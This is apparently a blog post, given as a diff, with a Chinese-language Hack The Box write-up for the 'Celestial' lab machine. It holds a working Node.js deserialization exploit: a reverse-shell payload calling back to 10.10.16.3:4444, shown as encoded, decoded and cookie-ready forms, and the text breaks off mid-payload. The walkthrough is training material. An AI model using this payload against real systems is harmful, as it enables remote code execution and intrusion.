@@ -1,0 +1,731 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="World&#39;sEnd">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="目标IP为10.10.10.85。 1nmap -p- -Pn -sV -sC -T4 10.10.10.85  123456Nmap scan report for 10.10.10.85Host is up (0.27s latency).Not shown: 65534 closed tcp ports (reset)PORT     STATE SERVICE VERSION3000&#x2F;tc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Walkthrough - Celestial">
+<meta property="og:url" content="https://crazyinside.github.io/post/HackTheBox-Celestial.html">
+<meta property="og:site_name" content="Network Security Notes">
+<meta property="og:description" content="目标IP为10.10.10.85。 1nmap -p- -Pn -sV -sC -T4 10.10.10.85  123456Nmap scan report for 10.10.10.85Host is up (0.27s latency).Not shown: 65534 closed tcp ports (reset)PORT     STATE SERVICE VERSION3000&#x2F;tc">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408132026752.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408132319093.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408132800103.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408141154804.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408135107129.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408141824523.png">
+<meta property="article:published_time" content="2023-08-13T22:39:08.996Z">
+<meta property="article:modified_time" content="2023-08-11T15:52:06.014Z">
+<meta property="article:author" content="World&#39;sEnd">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408132026752.png">
+  
+  
+  
+  <title>HTB Walkthrough - Celestial - Network Security Notes</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB Walkthrough - Celestial"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-14 06:39" pubdate>
+          August 14, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          17k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          141 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTB Walkthrough - Celestial</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>目标IP为10.10.10.85。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -Pn -sV -sC -T4 10.10.10.85</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.85</span><br><span class="line">Host is up (0.27s latency).</span><br><span class="line">Not shown: 65534 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">3000/tcp open  http    Node.js Express framework</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html; charset=utf-8).</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408132026752.png" srcset="/img/loading.gif" lazyload alt="image-20220408132026752"  />
+
+<p>反序列化注入，那就找反序列化注入点吧，看起来像是在Cookie字段：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408132319093.png" srcset="/img/loading.gif" lazyload alt="image-20220408132319093"  />
+
+<p>可以先对其进行URL解码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==</span><br></pre></td></tr></table></figure>
+
+<p>再对其进行Base64解码，这便是Cookie字段中的信息了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;Dummy&quot;</span>,<span class="string">&quot;country&quot;</span>:<span class="string">&quot;Idk Probably Somewhere Dumb&quot;</span>,<span class="string">&quot;city&quot;</span>:<span class="string">&quot;Lametown&quot;</span>,<span class="string">&quot;num&quot;</span>:<span class="string">&quot;2&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>哦我看到一个num：2，页面中也是有2这个数字的，要不我改改试试：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408132800103.png" srcset="/img/loading.gif" lazyload alt="image-20220408132800103"  />
+
+<p>好吧，它变成了3。Nmap为我枚举出了目标是Nodejs脚本语言环境，那我便可搜索Nodejs deserialization bug 。我找到了这个文章：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/</span><br></pre></td></tr></table></figure>
+
+<p>该序列化产生的漏洞原理就像文章作者的演示：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408141154804.png" srcset="/img/loading.gif" lazyload alt="image-20220408141154804"  />
+
+<p>它为我介绍了Nodejs语言反序列化利用细节，并为我推荐了一个Nodejs反序列化漏洞利用脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py</span><br></pre></td></tr></table></figure>
+
+<p>该脚本可以为我生成建立反向shell的载荷，用法也很简单：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 nodejsshell.py 10.10.16.3 4444</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[+] LHOST = 10.10.16.3</span><br><span class="line">[+] LPORT = 4444</span><br><span class="line">[+] Encoding</span><br><span class="line">eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,54,46,51,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))</span><br></pre></td></tr></table></figure>
+
+<p>如果好奇一大串十进制数字是什么意思，我推荐如下网址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html</span><br></pre></td></tr></table></figure>
+
+<p>将对应的编码类型填入合适的输入框中，它就会为你列出各种编码类型的意思：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408135107129.png" srcset="/img/loading.gif" lazyload alt="image-20220408135107129"  />
+
+<p>而我的载荷代码就是如下这样的：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&#x27;net&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> spawn = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="property">spawn</span>;</span><br><span class="line"><span class="variable constant_">HOST</span>=<span class="string">&quot;10.10.16.3&quot;</span>;</span><br><span class="line"><span class="variable constant_">PORT</span>=<span class="string">&quot;4444&quot;</span>;</span><br><span class="line"><span class="variable constant_">TIMEOUT</span>=<span class="string">&quot;5000&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="title class_">String</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">contains</span> === <span class="string">&#x27;undefined&#x27;</span>) &#123; <span class="title class_">String</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">contains</span> = <span class="keyword">function</span>(<span class="params">it</span>) &#123; <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">indexOf</span>(it) != -<span class="number">1</span>; &#125;; &#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">c</span>(<span class="params">HOST,PORT</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> client = <span class="keyword">new</span> net.<span class="title class_">Socket</span>();</span><br><span class="line">    client.<span class="title function_">connect</span>(<span class="variable constant_">PORT</span>, <span class="variable constant_">HOST</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> sh = <span class="title function_">spawn</span>(<span class="string">&#x27;/bin/sh&#x27;</span>,[]);</span><br><span class="line">        client.<span class="title function_">write</span>(<span class="string">&quot;Connected!\n&quot;</span>);</span><br><span class="line">        client.<span class="title function_">pipe</span>(sh.<span class="property">stdin</span>);</span><br><span class="line">        sh.<span class="property">stdout</span>.<span class="title function_">pipe</span>(client);</span><br><span class="line">        sh.<span class="property">stderr</span>.<span class="title function_">pipe</span>(client);</span><br><span class="line">        sh.<span class="title function_">on</span>(<span class="string">&#x27;exit&#x27;</span>,<span class="keyword">function</span>(<span class="params">code,signal</span>)&#123;</span><br><span class="line">          client.<span class="title function_">end</span>(<span class="string">&quot;Disconnected!\n&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    client.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="title function_">c</span>(<span class="variable constant_">HOST</span>,<span class="variable constant_">PORT</span>), <span class="variable constant_">TIMEOUT</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">c</span>(<span class="variable constant_">HOST</span>,<span class="variable constant_">PORT</span>);</span><br></pre></td></tr></table></figure>
+
+<p>究竟如何利用，文章作者也为我很好的展示了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function ()&#123; eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,54,46,51,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10) )&#125;()&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7IGV2YWwoU3RyaW5nLmZyb21DaGFyQ29kZSgxMCwxMTgsOTcsMTE0LDMyLDExMCwxMDEsMTE2LDMyLDYxLDMyLDExNCwxMDEsMTEzLDExNywxMDUsMTE0LDEwMSw0MCwzOSwxMTAsMTAxLDExNiwzOSw0MSw1OSwxMCwxMTgsOTcsMTE0LDMyLDExNSwxMTIsOTcsMTE5LDExMCwzMiw2MSwzMiwxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksOTksMTA0LDEwNSwxMDgsMTAwLDk1LDExMiwxMTQsMTExLDk5LDEwMSwxMTUsMTE1LDM5LDQxLDQ2LDExNSwxMTIsOTcsMTE5LDExMCw1OSwxMCw3Miw3OSw4Myw4NCw2MSwzNCw0OSw0OCw0Niw0OSw0OCw0Niw0OSw1NCw0Niw1MSwzNCw1OSwxMCw4MCw3OSw4Miw4NCw2MSwzNCw1Miw1Miw1Miw1MiwzNCw1OSwxMCw4NCw3Myw3Nyw2OSw3OSw4NSw4NCw2MSwzNCw1Myw0OCw0OCw0OCwzNCw1OSwxMCwxMDUsMTAyLDMyLDQwLDExNiwxMjEsMTEyLDEwMSwxMTEsMTAyLDMyLDgzLDExNiwxMTQsMTA1LDExMCwxMDMsNDYsMTEyLDExNCwxMTEsMTE2LDExMSwxMTYsMTIxLDExMiwxMDEsNDYsOTksMTExLDExMCwxMTYsOTcsMTA1LDExMCwxMTUsMzIsNjEsNjEsNjEsMzIsMzksMTE3LDExMCwxMDAsMTAxLDEwMiwxMDUsMTEwLDEwMSwxMDAsMzksNDEsMzIsMTIzLDMyLDgzLDExNiwxMTQsMTA1LDExMCwxMDMsNDYsMTEyLDExNCwxMTEsMTE2LDExMSwxMTYsMTIxLDExMiwxMDEsNDYsOTksMTExLDExMCwxMTYsOTcsMTA1LDExMCwxMTUsMzIsNjEsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwNSwxMTYsNDEsMzIsMTIzLDMyLDExNCwxMDEsMTE2LDExNywxMTQsMTEwLDMyLDExNiwxMDQsMTA1LDExNSw0NiwxMDUsMTEwLDEwMCwxMDEsMTIwLDc5LDEwMiw0MCwxMDUsMTE2LDQxLDMyLDMzLDYxLDMyLDQ1LDQ5LDU5LDMyLDEyNSw1OSwzMiwxMjUsMTAsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDMyLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwxMTgsOTcsMTE0LDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsMzIsNjEsMzIsMTEwLDEwMSwxMTksMzIsMTEwLDEwMSwxMTYsNDYsODMsMTExLDk5LDEwNywxMDEsMTE2LDQwLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsOTksMTExLDExMCwxMTAsMTAxLDk5LDExNiw0MCw4MCw3OSw4Miw4NCw0NCwzMiw3Miw3OSw4Myw4NCw0NCwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExOCw5NywxMTQsMzIsMTE1LDEwNCwzMiw2MSwzMiwxMTUsMTEyLDk3LDExOSwxMTAsNDAsMzksNDcsOTgsMTA1LDExMCw0NywxMTUsMTA0LDM5LDQ0LDkxLDkzLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTE5LDExNCwxMDUsMTE2LDEwMSw0MCwzNCw2NywxMTEsMTEwLDExMCwxMDEsOTksMTE2LDEwMSwxMDAsMzMsOTIsMTEwLDM0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTA1LDExMCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDExMSwxMTcsMTE2LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTAxLDExNCwxMTQsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTEsMTEwLDQwLDM5LDEwMSwxMjAsMTA1LDExNiwzOSw0NCwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsOTksMTExLDEwMCwxMDEsNDQsMTE1LDEwNSwxMDMsMTEwLDk3LDEwOCw0MSwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMDEsMTEwLDEwMCw0MCwzNCw2OCwxMDUsMTE1LDk5LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsMTAxLDEwMCwzMyw5MiwxMTAsMzQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExMSwxMTAsNDAsMzksMTAxLDExNCwxMTQsMTExLDExNCwzOSw0NCwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsMTAxLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTAxLDExNiw4NCwxMDUsMTA5LDEwMSwxMTEsMTE3LDExNiw0MCw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSw0NCwzMiw4NCw3Myw3Nyw2OSw3OSw4NSw4NCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMTI1LDEwLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDg